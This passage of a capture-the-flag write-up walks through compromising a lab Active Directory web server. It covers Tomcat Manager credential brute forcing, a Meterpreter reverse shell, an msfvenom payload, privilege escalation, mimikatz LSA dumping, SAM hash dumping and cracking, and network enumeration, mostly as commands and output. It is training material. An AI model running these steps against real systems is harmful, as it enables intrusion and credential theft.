+   20  exploit/windows/http/tomcat_cgi_cmdlineargs                  2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability
+   21  post/multi/gather/tomcat_gather                                               normal     No     Gather Tomcat Credentials
+   22  post/windows/gather/enum_tomcat                                               normal     No     Windows Gather Apache Tomcat Enumeration
+</code></pre>
+<p>I use module 8 to attempt our login to the Tomcat Application Manager. Simply select the module using command <code>use 8</code> and configured it properly. After that, I ran the module using command <code>exploit</code>.</p>
+<pre><code>msf6 &gt; use 8
+msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; set RHOST 192.168.240.80
+RHOST =&gt; 192.168.240.80
+msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; run
+
+[-] 192.168.240.80:8080 - LOGIN FAILED: admin:admin (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: admin:manager (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: admin:role1 (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: admin:root (Incorrect)
+[+] 192.168.240.80:8080 - Login Successful: admin:tomcat
+[-] 192.168.240.80:8080 - LOGIN FAILED: manager:admin (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: manager:manager (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: manager:role1 (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: manager:root (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: manager:tomcat (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: manager:s3cret (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: manager:vagrant (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: role1:admin (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: role1:manager (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: role1:role1 (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: role1:root (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: role1:tomcat (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: role1:s3cret (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: role1:vagrant (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: root:admin (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: root:manager (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: root:role1 (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: root:root (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: root:tomcat (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: root:s3cret (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: root:vagrant (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:admin (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:manager (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:role1 (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:root (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:tomcat (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:s3cret (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:vagrant (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: both:admin (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: both:manager (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: both:role1 (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: both:root (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: both:tomcat (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: both:s3cret (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: both:vagrant (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: j2deployer:j2deployer (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: ovwebusr:OvW*busr1 (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: cxsdk:kdsxc (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: root:owaspbwa (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: ADMIN:ADMIN (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: xampp:xampp (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: tomcat:s3cret (Incorrect)
+[-] 192.168.240.80:8080 - LOGIN FAILED: QCC:QLogic66 (Incorrect)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</code></pre>
+<p>Got the valid credential for tomcat (<strong>admin:tomcat</strong>). I login the Tomcat Manager site with the credential and I'm inside!</p>
+<p><img alt="" src="/images/ctf-round-3-active-directory/13.png" /></p>
+<h4 id="answer-admintomcat">Answer: admin:tomcat</h4>
+<h3 id="q2-md5-checksum-hash-for-file-tomcatico">Q2 - MD5 checksum hash for file 'tomcat.ico'</h3>
+<p><img alt="" src="/images/ctf-round-3-active-directory/6.png" /></p>
+<p>Next, I need to gain access to the remote target through the Apache Tomcat service. To do that, I ran <code>use 17</code> to select module <code>multi/http/tomcat_mgr_upload</code> and configured it properly. Then I ran the exploit.</p>
+<pre><code>msf6 auxiliary(scanner/http/tomcat_mgr_login) &gt; use 17
+[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
+msf6 exploit(multi/http/tomcat_mgr_upload) &gt; set HttpPassword tomcat
+HttpPassword =&gt; tomcat
+msf6 exploit(multi/http/tomcat_mgr_upload) &gt; set HttpUsername admin
+HttpUsername =&gt; admin
+msf6 exploit(multi/http/tomcat_mgr_upload) &gt; set RHOSTS 192.168.240.80
+RHOSTS =&gt; 192.168.240.80
+msf6 exploit(multi/http/tomcat_mgr_upload) &gt; set RPORT 8080
+RPORT =&gt; 8080
+msf6 exploit(multi/http/tomcat_mgr_upload) &gt; set LHOST 10.0.200.2
+LHOST =&gt; 10.0.200.2
+msf6 exploit(multi/http/tomcat_mgr_upload) &gt; exploit
+
+[*] Started reverse TCP handler on 10.0.200.2:4444 
+[*] Retrieving session ID and CSRF token...
+[*] Uploading and deploying obllDiY...
+[*] Executing obllDiY...
+[*] Sending stage (58125 bytes) to 192.168.240.80
+[*] Meterpreter session 1 opened (10.0.200.2:4444 -&gt; 192.168.240.80:57086) at 2020-11-22 00:45:10 +0800
+[*] Undeploying obllDiY ...
+
+meterpreter &gt; 
+</code></pre>
+<p>The exploit working and now I have a Meterpreter shell on the remote target. I ran <code>sysinfo</code> to get information about the remote system and <code>getuid</code> to get the user that the server is running as.</p>
+<pre><code>meterpreter &gt; sysinfo
+Computer    : prod-websrv7765
+OS          : Windows Server 2012 R2 6.3 (amd64)
+Meterpreter : java/windows
+
+meterpreter &gt; getuid
+Server username: LOCAL SERVICE
+</code></pre>
+<p>Right now, I'm as <code>LOCAL SERVICE</code>. Next, I ran <code>ls</code> to list out the folders and files.</p>
+<pre><code>meterpreter &gt; ls
+Listing: C:\Program Files\Apache Software Foundation\Tomcat 8.5
+===============================================================
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+100776/rwxrwxrw-  58068  fil   2020-10-07 00:58:40 +0800  LICENSE
+100776/rwxrwxrw-  1777   fil   2020-10-07 00:58:40 +0800  NOTICE
+100776/rwxrwxrw-  7314   fil   2020-10-07 00:58:40 +0800  RELEASE-NOTES
+100776/rwxrwxrw-  81704  fil   2020-10-07 00:59:30 +0800  Uninstall.exe
+40776/rwxrwxrw-   4096   dir   2020-11-03 08:58:32 +0800  bin
+40776/rwxrwxrw-   4096   dir   2020-11-03 09:21:48 +0800  conf
+40776/rwxrwxrw-   12288  dir   2020-11-03 08:58:32 +0800  lib
+40776/rwxrwxrw-   16384  dir   2020-11-22 00:29:46 +0800  logs
+40776/rwxrwxrw-   4096   dir   2020-11-22 00:45:18 +0800  temp
+100776/rwxrwxrw-  21630  fil   2020-10-07 00:58:50 +0800  tomcat.ico
+40776/rwxrwxrw-   16384  dir   2020-11-22 00:45:15 +0800  webapps
+40776/rwxrwxrw-   0      dir   2020-11-18 13:55:43 +0800  work
+</code></pre>
+<p>This question ask for MD5 hash for <code>tomcat.ico</code>. To do that, I ran <code>checksum md5 tomcat.ico</code>.</p>
+<pre><code>meterpreter &gt; checksum md5 tomcat.ico
+4644f2d45601037b8423d45e13194c93  tomcat.ico
+</code></pre>
+<h4 id="answer-4644f2d45601037b8423d45e13194c93">Answer: 4644f2d45601037b8423d45e13194c93</h4>
+<h3 id="q3-plain-text-password-for-domain-user">Q3 - Plain text password for domain user</h3>
+<p><img alt="" src="/images/ctf-round-3-active-directory/7.png" /></p>
+<p>Next, I need to create a windows meterpreter using <code>msfvenom</code>. Simply ran <code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.200.2 LPORT=5555 -f exe &gt; meterpreter.exe</code>.</p>
+<pre><code>$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.200.2 LPORT=5555 -f exe &gt; meterpreter.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+
+$ file meterpreter.exe 
+meterpreter.exe: PE32+ executable (GUI) x86-64, for MS Windows
+</code></pre>
+<p>Now I have a Windows executable ready to go. Next, I used <code>exploit/multi/handler</code> to handle the exploit launched outside of the framework. I configured the handler exactly same as the configuration I used to create the Windows binary Meterpreter. Then I ran <code>exploit</code>.</p>
+<pre><code>$ msfconsole -q
+msf6 &gt; use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
+payload =&gt; windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) &gt; set LHOST 10.0.200.2
+LHOST =&gt; 10.0.200.2
+msf6 exploit(multi/handler) &gt; set LPORT 5555
+LPORT =&gt; 5555
+msf6 exploit(multi/handler) &gt; exploit
+
+[*] Started reverse TCP handler on 10.0.200.2:5555
+</code></pre>
+<p>After that, I went back to other Meterpreter. I uploaded the Windows binary, spawned a shell and ran the binary.</p>
+<pre><code>meterpreter &gt; upload meterpreter.exe
+[*] uploading  : meterpreter.exe -&gt; meterpreter.exe
+[*] Uploaded -1.00 B of 7.00 KiB (-0.01%): meterpreter.exe -&gt; meterpreter.exe
+[*] uploaded   : meterpreter.exe -&gt; meterpreter.exe
+meterpreter &gt; shell
+Process 4 created.
+Channel 5 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Program Files\Apache Software Foundation\Tomcat 8.5&gt;meterpreter.exe
+meterpreter.exe
+</code></pre>
+<p>Now I have Windows Meterpreter running.</p>
+<pre><code>[*] Sending stage (200262 bytes) to 192.168.240.80
+[*] Meterpreter session 1 opened (10.0.200.2:5555 -&gt; 192.168.240.80:57639) at 2020-11-22 01:47:30 +0800
+
+meterpreter &gt;
+</code></pre>
+<p>Right now, I'm <code>NT AUTHORITY\LOCAL SERVICE</code> and I need to get <code>NT AUTHORITY\SYSTEM</code>. To achieve that, here's come privilege escalation.  </p>
+<p>I do some digging and found module <code>post/multi/recon/local_exploit_suggester</code>. This module suggested local meterpreter exploits that can be used. I ran <code>background</code> and <code>use post/multi/recon/local_exploit_suggester</code>. I configured it with session 1 and ran the module.</p>
+<pre><code>meterpreter &gt; background
+[*] Backgrounding session 1...
+msf6 exploit(multi/handler) &gt; use post/multi/recon/local_exploit_suggester
+msf6 post(multi/recon/local_exploit_suggester) &gt; set SESSION 1
+SESSION =&gt; 1
+msf6 post(multi/recon/local_exploit_suggester) &gt; run
+
+[*] 192.168.240.80 - Collecting local exploits for x64/windows...
+[*] 192.168.240.80 - 20 exploit checks are being tried...
+[+] 192.168.240.80 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
+[+] 192.168.240.80 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
+[+] 192.168.240.80 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.
+nil versions are discouraged and will be deprecated in Rubygems 4
+[+] 192.168.240.80 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+[+] 192.168.240.80 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
+[*] Post module execution completed
+</code></pre>
+<p>I give a try to <code>exploit/windows/local/bypassuac_dotnet_profiler</code>.</p>
+<pre><code>msf6 post(multi/recon/local_exploit_suggester) &gt; use exploit/windows/local/bypassuac_dotnet_profiler
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/local/bypassuac_dotnet_profiler) &gt; set SESSION 1
+SESSION =&gt; 1
+msf6 exploit(windows/local/bypassuac_dotnet_profiler) &gt; set LHOST 10.0.200.2
+LHOST =&gt; 10.0.200.2
+msf6 exploit(windows/local/bypassuac_dotnet_profiler) &gt; set LPORT 6666
+LPORT =&gt; 6666
+msf6 exploit(windows/local/bypassuac_dotnet_profiler) &gt; run
+
+[*] Started reverse TCP handler on 10.0.200.2:6666 
+[*] UAC is Enabled, checking level...
+[-] Exploit aborted due to failure: no-access: Not in admins group, cannot escalate with this module
+[*] Exploit completed, but no session was created.
+</code></pre>
+<p>Hurm no luck. Moving on to <code>exploit/windows/local/bypassuac_sdclt</code>.</p>
+<pre><code>msf6 exploit(windows/local/bypassuac_dotnet_profiler) &gt; use exploit/windows/local/bypassuac_sdclt
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/local/bypassuac_sdclt) &gt; set SESSION 1
+SESSION =&gt; 1
+msf6 exploit(windows/local/bypassuac_sdclt) &gt; set LHOST 10.0.200.2
+LHOST =&gt; 10.0.200.2
+msf6 exploit(windows/local/bypassuac_sdclt) &gt; set LPORT 6666
+LPORT =&gt; 6666
+msf6 exploit(windows/local/bypassuac_sdclt) &gt; run
+
+[*] Started reverse TCP handler on 10.0.200.2:6666 
+[*] UAC is Enabled, checking level...
+[-] Exploit aborted due to failure: no-access: Not in admins group, cannot escalate with this module
+[*] Exploit completed, but no session was created.
+</code></pre>
+<p>No luck again. I skipped the other 2 and use <code>exploit/windows/local/ms16_075_reflection_juicy</code> because it said juicy?</p>
+<pre><code>msf6 exploit(windows/local/bypassuac_sdclt) &gt; use exploit/windows/local/ms16_075_reflection_juicy
+[*] Using configured payload windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/ms16_075_reflection_juicy) &gt; set SESSION 1
+SESSION =&gt; 1
+msf6 exploit(windows/local/ms16_075_reflection_juicy) &gt; set LHOST 10.0.200.2
+LHOST =&gt; 10.0.200.2
+msf6 exploit(windows/local/ms16_075_reflection_juicy) &gt; set LPORT 6666
+LPORT =&gt; 6666
+msf6 exploit(windows/local/ms16_075_reflection_juicy) &gt; run
+
+[*] Started reverse TCP handler on 10.0.200.2:6666 
+[+] Target appears to be vulnerable (Windows 2012 R2 (6.3 Build 9600).)
+[*] Launching notepad to host the exploit...
+[+] Process 3056 launched.
+[*] Reflectively injecting the exploit DLL into 3056...
+[*] Injecting exploit into 3056...
+[*] Exploit injected. Injecting exploit configuration into 3056...
+[*] Configuration injected. Executing exploit...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Sending stage (175174 bytes) to 192.168.240.80
+[*] Meterpreter session 2 opened (10.0.200.2:6666 -&gt; 192.168.240.80:57925) at 2020-11-22 02:19:16 +0800
+
+meterpreter &gt;
+</code></pre>
+<p>I'm in as <code>NT AUTHORITY\SYSTEM</code>.</p>
+<pre><code>meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+</code></pre>
+<p>To answer the question, I ran <code>use kiwi</code> to load kiwi module and <code>lsa_dump_secrets</code> to dump LSA secrets. <code>Kiwi</code> module used to perform various types of credential-oriented operations such as dumping passwords and hashes, dumping passwords in memory, generating golden tickets, and more.</p>
+<pre><code>meterpreter &gt; use kiwi
+Loading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
+ .## ^ ##.  &quot;A La Vie, A L'Amour&quot; - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/
+
+[!] Loaded x86 Kiwi on an x64 architecture.
+
+Success.
+meterpreter &gt; lsa_dump_secrets
+[+] Running as SYSTEM
+[*] Dumping LSA secrets
+Domain : PROD-WEBSRV7765
+SysKey : 14a513800f23074d06b371d5b4bfdb86
+
+Local name : PROD-WEBSRV7765 ( S-1-5-21-1669853405-1314316162-1621276032 )
+Domain name : MYCOMS ( S-1-5-21-2804598327-1020562986-2106375421 )
+Domain FQDN : mycoms.com.local
+
+Policy subsystem is : 1.12
+LSA Key(s) : 1, default {623d7843-d8a7-c5a9-01fa-119217f4064e}
+  [00] {623d7843-d8a7-c5a9-01fa-119217f4064e} b45240c17c8897e3d5270783f4cc737f278b68d474c51a505bc077bf2220b1df
+
+Secret  : $MACHINE.ACC
+cur/text: WI6$*\T[fZ%F!qqD%?^U]E&quot;jn &amp;Cne6fI2qCJp wz9&lt;@K!wVZi;^3vnV&gt;b(9g3l2#o@q%bEko62%n2`ogG2rwc6/@XNumW__4/b;j8j/k0o++/n ._/s9`^'
+    NTLM:eddb95449e4807dedc0d2ecdbe361719
+    SHA1:2e0566e564a5cb48646c1d3560022113efdc4df5
+old/text: WI6$*\T[fZ%F!qqD%?^U]E&quot;jn &amp;Cne6fI2qCJp wz9&lt;@K!wVZi;^3vnV&gt;b(9g3l2#o@q%bEko62%n2`ogG2rwc6/@XNumW__4/b;j8j/k0o++/n ._/s9`^'
+    NTLM:eddb95449e4807dedc0d2ecdbe361719
+    SHA1:2e0566e564a5cb48646c1d3560022113efdc4df5
+
+Secret  : DefaultPassword
+
+Secret  : DPAPI_SYSTEM
+cur/hex : 01 00 00 00 d9 d2 0c 8c f2 c0 fe 37 7e 8a 5b f6 a9 38 49 99 8b a6 93 20 b2 9e c0 9d c6 41 5a a6 cc df 31 fd 9b ce 53 ba 1e 8c 31 71 
+    full: d9d20c8cf2c0fe377e8a5bf6a93849998ba69320b29ec09dc6415aa6ccdf31fd9bce53ba1e8c3171
+    m/u : d9d20c8cf2c0fe377e8a5bf6a93849998ba69320 / b29ec09dc6415aa6ccdf31fd9bce53ba1e8c3171
+old/hex : 01 00 00 00 55 0b 07 be cc e6 4f 90 bb 45 62 4a 4a dc 7f 91 50 a8 90 cc dd dc d2 a3 ce 33 5a 29 49 3d 60 6f 25 a5 03 2e 42 39 b1 96 
+    full: 550b07becce64f90bb45624a4adc7f9150a890ccdddcd2a3ce335a29493d606f25a5032e4239b196
+    m/u : 550b07becce64f90bb45624a4adc7f9150a890cc / dddcd2a3ce335a29493d606f25a5032e4239b196
+
+Secret  : NL$KM
+cur/hex : 29 5b d7 f4 51 cb 5a 3f e2 9e bb cd 4f 8a 7c 36 d3 31 1e 24 9c 7e a4 da c6 b0 57 78 3e 4b e6 f3 b2 2d fd d8 83 b6 9e 9e f8 fc 13 d3 77 37 e4 7f 8b 6a 7c ad 41 2c 86 06 1c 0d ef 4d 0a c2 e1 59 
+
+Secret  : _SC_SplunkForwarder / service 'SplunkForwarder' with username : mycoms\ali
+cur/text: P@ssw0rd123!
+</code></pre>
+<p>The password for domain user is stated there.</p>
+<h4 id="answer-pssw0rd123">Answer: P@ssw0rd123!</h4>
+<h3 id="q4-ntlm-hash-result-for-user-administrator">Q4 - NTLM hash result for user Administrator</h3>
+<p><img alt="" src="/images/ctf-round-3-active-directory/8.png" /></p>
+<p>For this question, I use <code>post/windows/gather/smart_hashdump</code> to dump local accounts from the SAM Database.</p>
+<pre><code>meterpreter &gt; background
+[*] Backgrounding session 2...
+msf6 exploit(windows/local/ms16_075_reflection_juicy) &gt; use post/windows/gather/smart_hashdump
+msf6 post(windows/gather/smart_hashdump) &gt; set SESSION 2
+SESSION =&gt; 2
+msf6 post(windows/gather/smart_hashdump) &gt; run
+
+[*] Running module against PROD-WEBSRV7765
+[*] Hashes will be saved to the database if one is connected.
+[+] Hashes will be saved in loot in JtR password file format to:
+[*] /home/ahmad/.msf4/loot/20201122030536_default_192.168.240.80_windows.hashes_705427.txt
+[*] Dumping password hashes...
+[*] Running as SYSTEM extracting hashes from registry
+[*]     Obtaining the boot key...
+[*]     Calculating the hboot key using SYSKEY 14a513800f23074d06b371d5b4bfdb86...
+[*]     Obtaining the user list and keys...
+[*]     Decrypting user keys...
+[*]     Dumping password hints...
+[*]     No users with password hints on this system
+[*]     Dumping password hashes...
+[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+[*] Post module execution completed
+</code></pre>
+<p>Now I have the full NTLM hash for Administrator.</p>
+<h4 id="answer-administrator500aad3b435b51404eeaad3b435b51404eee19ccf75ee54e06b06a5907af13cef42">Answer: Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::</h4>
+<h3 id="q5-plain-text-password-for-user-administrator">Q5 - Plain text password for user Administrator</h3>
+<p><img alt="" src="/images/ctf-round-3-active-directory/9.png" /></p>
+<p>The full NTLM hash consist of 4 parts which are <code>username</code> : <code>relative identifier</code> : <code>LM hash</code> : <code>NT hash</code> :::. To get the password for user Administrator, I need to crack the <code>NT hash</code> using <code>john</code> or <a href="https://crackstation.net/">crackstation.net</a>. I copied the <code>NT hash</code> and paste it on online tool.</p>
+<p><img alt="" src="/images/ctf-round-3-active-directory/14.png" /></p>
+<h4 id="answer-pssw0rd">Answer: P@ssw0rd</h4>
+<h3 id="q6-domain-user">Q6 - Domain User</h3>
+<p><img alt="" src="/images/ctf-round-3-active-directory/10.png" /></p>
+<p>Based on the output of <code>lsa_dump_secrets</code>, the domain user is ali</p>
+<h4 id="answer-ali">Answer: ali</h4>
+<h3 id="q7-domain-admin">Q7 - Domain Admin</h3>
+<p><img alt="" src="/images/ctf-round-3-active-directory/11.png" /></p>
+<p>I uploaded <code>winPEAS.exe</code> and executed it. Here's the output of <code>winPEAE.exe</code> on <code>Users Information</code>.</p>
+<pre><code>===========================================(Users Information)===========================================
+
+  [+] Users
+   [?] Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#users-and-groups
+  Current user: SYSTEM
+  Current groups: Administrators, Everyone, Authenticated Users
+   =================================================================================================
+
+    PROD-WEBSRV7765\Administrator: Built-in account for administering the computer/domain
+        |-&gt;Groups: Administrators
+        |-&gt;Password: CanChange-Expi-Req
+
+    PROD-WEBSRV7765\Guest(Disabled): Built-in account for guest access to the computer/domain
+        |-&gt;Groups: Guests
+        |-&gt;Password: NotChange-NotExpi-NotReq
+
+    MYCOMS\Administrator: Built-in account for administering the computer/domain
+        |-&gt;Groups: Domain Users,Administrators,Schema Admins,Enterprise Admins,Domain Admins,Group Policy Creator Owners
+        |-&gt;Password: CanChange-Expi-Req
+
+    MYCOMS\Guest(Disabled): Built-in account for guest access to the computer/domain
+        |-&gt;Groups: Domain Guests,Guests
+        |-&gt;Password: NotChange-NotExpi-NotReq
+
+    MYCOMS\krbtgt(Disabled): Key Distribution Center Service Account
+        |-&gt;Groups: Domain Users,Denied RODC Password Replication Group
+        |-&gt;Password: CanChange-Expi-Req
+
+    MYCOMS\abu
+        |-&gt;Groups: Domain Users,Enterprise Admins,Domain Admins
+        |-&gt;Password: CanChange-NotExpi-Req
+
+    MYCOMS\ali
+        |-&gt;Groups: Domain Users,Performance Log Users,Event Log Readers
+        |-&gt;Password: NotChange-NotExpi-Req
+
+    MYCOMS\umar
+        |-&gt;Groups: Domain Users,Domain Admins
+        |-&gt;Password: CanChange-NotExpi-Req
+</code></pre>
+<p>Note that there were 2 domain admins who are <code>abu</code> and <code>umar</code>.</p>
+<h4 id="answer-abuumar">Answer: abu:umar</h4>
+<h3 id="q8-enterprise-admins">Q8 - Enterprise Admins</h3>
+<p><img alt="" src="/images/ctf-round-3-active-directory/12.png" /></p>
+<p>Based on the output of <code>winPEAS.exe</code> on <code>Users Information</code>, there is only enterprise admin who is <code>abu</code>.</p>
+<h4 id="answer-abu">Answer: abu</h4>
+<h2 id="challenges-file-server">Challenges - File Server</h2>
+<h3 id="q1-ip-address-of-file-server">Q1 - IP address of file server</h3>
+<p><img alt="" src="/images/ctf-round-3-active-directory/15.png" /></p>
+<p>On the meterpreter, I ran <code>arp</code> to display the host ARP cache.</p>
+<pre><code>meterpreter &gt; arp
+
+ARP cache
+=========
+
+    IP address       MAC address        Interface
+    ----------       -----------        ---------
+    192.168.240.1    00:0c:29:4c:f2:d9  12
+    192.168.240.13   00:50:56:ab:40:8b  12
+    192.168.240.30   00:0c:29:3b:05:22  12
+    192.168.240.255  ff:ff:ff:ff:ff:ff  12
+    224.0.0.22       00:00:00:00:00:00  1
+    224.0.0.22       01:00:5e:00:00:16  12
+    224.0.0.252      01:00:5e:00:00:fc  12
+</code></pre>
+<p>I tried to nmap each of the address. The 1st address gives nothing. Then move on to the next one, it has hostname included <code>fsrv</code>. </p>
+<pre><code>$ nmap -Pn -A 192.168.240.13
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-22 03:41 +08
+Nmap scan report for 192.168.240.13
+Host is up (0.055s latency).
+Not shown: 995 filtered ports
+PORT     STATE  SERVICE            VERSION
+111/tcp  closed rpcbind
+135/tcp  open   msrpc              Microsoft Windows RPC
+139/tcp  open   netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp  open   microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+3389/tcp open   ssl/ms-wbt-server?
+| ssl-cert: Subject: commonName=prod-fsrv5633.mycoms.com.local
+| Not valid before: 2020-11-02T10:27:27
+|_Not valid after:  2021-05-04T10:27:27
+|_ssl-date: 2020-11-21T19:42:09+00:00; -12s from scanner time.
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -12s, deviation: 0s, median: -12s
+|_nbstat: NetBIOS name: PROD-FSRV5633, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:ab:40:8b (VMware)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-11-21T19:41:29
+|_  start_date: 2020-11-03T10:27:26
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 57.07 seconds
+</code></pre>
+<h4 id="answer-19216824013">Answer: 192.168.240.13</h4>
+<h3 id="q2-folder-share-name-that-domain-user-has-write-access-to-file-server">Q2 - Folder share name that 'domain user' has write access to file server</h3>
+<p><img alt="" src="/images/ctf-round-3-active-directory/2.png" /></p>
+<h3 id="q3-ntlm-hash-result-for-user-administrator">Q3 - NTLM hash result for user Administrator</h3>
+<p><img alt="" src="/images/ctf-round-3-active-directory/2.png" /></p>
+<h3 id="q4-ntlm-hash-result-for-user-mar">Q4 - NTLM hash result for user "*mar"</h3>
+<p><img alt="" src="/images/ctf-round-3-active-directory/2.png" /></p>
+<h3 id="q5-plain-text-password-for-user-administrator_1">Q5 - Plain text password for user Administrator</h3>
+<p><img alt="" src="/images/ctf-round-3-active-directory/2.png" /></p>
+<p>to be continue ...</p>
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
+        
+          <a href="../../.." class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+            </div>
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                Home
+              </div>
+            </div>
+          </a>
+        
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../../assets/javascripts/vendor.fd16492e.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.7836ba4d.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
+      
+      <script>
+        app = initialize({
+          base: "../../..",
+          features: [],
